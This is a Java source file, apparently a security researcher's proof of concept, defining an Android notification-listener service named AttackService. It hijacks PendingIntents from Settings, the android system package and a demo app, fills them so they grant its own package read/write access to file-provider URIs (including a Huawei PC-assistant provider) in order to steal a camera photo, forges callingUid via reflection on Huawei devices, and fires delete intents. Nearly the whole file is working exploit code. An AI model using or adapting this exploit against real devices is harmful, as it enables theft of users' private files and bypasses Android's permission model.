package com.wrlus.stest;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ClipData;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import me.weishu.reflection.Reflection;

public class AttackService extends NotificationListenerService {
    private static final String TAG = "STest";
    private static final List<String> targetPackages = new ArrayList<>();
    private static final Map<String, String> uriMap = new HashMap<>();

    static {
        targetPackages.add("com.android.settings");
        targetPackages.add("android");
        targetPackages.add("com.wrlus.sdemo");

        uriMap.put("com.android.settings", "content://com.huawei.pcassistant.provider/root/");
        uriMap.put("android", "content://com.huawei.pcassistant.provider/root/");
        uriMap.put("com.wrlus.sdemo", "content://com.wrlus.sdemo.fileprovider/external_files/");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return Service.START_NOT_STICKY;
    }

    @Override
    protected void attachBaseContext(Context newBase) {
        super.attachBaseContext(newBase);
        Reflection.unseal(newBase);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (! (targetPackages.contains(sbn.getPackageName())) ) {
            Log.w(TAG, "Not target packageName, real value = "+sbn.getPackageName());
            return;
        }
        Notification notification = sbn.getNotification();
        if (notification == null) {
            Log.e(TAG, "Notification is null");
            return;
        }
        Bundle extras = notification.extras;
        if (extras != null) {
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String content = extras.getString(Notification.EXTRA_TEXT, "");
            Log.i(TAG, "Received notification: Title="+title+", content="+content);
//            Notification.contentIntent exploit code
            PendingIntent contentIntent = notification.contentIntent;
            if (contentIntent != null) {
                Log.d(TAG, "Start exploit contentIntent, creatorUid=" +
                        contentIntent.getCreatorUid() +
                        ", creatorPackage=" +
                        contentIntent.getCreatorPackage());
                Intent fillInIntent = new Intent();
//                Sent the intent to our package
                fillInIntent.setPackage(getPackageName());
//                Grant URI permission to our package
                fillInIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION |
                        Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
                String filePath = "sdcard/DCIM/Camera/IMG_20220118_172934.jpg";
//                A good file provider to steal files
                Uri providerUri = Uri.parse(uriMap.get(sbn.getPackageName()) + filePath);
//                fillInIntent.setData(providerUri);
                fillInIntent.setClipData(ClipData.newRawUri(null, providerUri));
//                Special step for Huawei
                setCallingUid(fillInIntent, contentIntent.getCreatorUid());

                try {
                    contentIntent.send(this, 0, fillInIntent, null, null);
                    Log.d(TAG, "ContentIntent sent to ExpActivity");
                } catch (PendingIntent.CanceledException e) {
                    e.printStackTrace();
                }
            }
//            Notification.deleteIntent exploit code
            PendingIntent deleteIntent = notification.deleteIntent;
            if (deleteIntent != null) {
                Log.d(TAG, "Start exploit deleteIntent, creatorUid=" +
                        deleteIntent.getCreatorUid() +
                        ", creatorPackage=" +
                        deleteIntent.getCreatorPackage());
                Intent fillInIntent = new Intent();

                try {
                    deleteIntent.send(this, 0, fillInIntent, null, null);
                    Log.d(TAG, "DeleteIntent sent");
                } catch (PendingIntent.CanceledException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    /**
     * This code is special for Huawei devices
     */
    private void setCallingUid(Intent intent, int callingUid) {
        try {
            Field callingUidField = intent.getClass().getDeclaredField("callingUid");
            callingUidField.setAccessible(true);
            callingUidField.setInt(intent, callingUid);
            Log.i(TAG, "Setting callingUid for Huawei devices successfully");
        } catch (ReflectiveOperationException e) {
            e.printStackTrace();
            Log.w(TAG, "Not Huawei devices, ignore setting callingUid");
        }
    }

}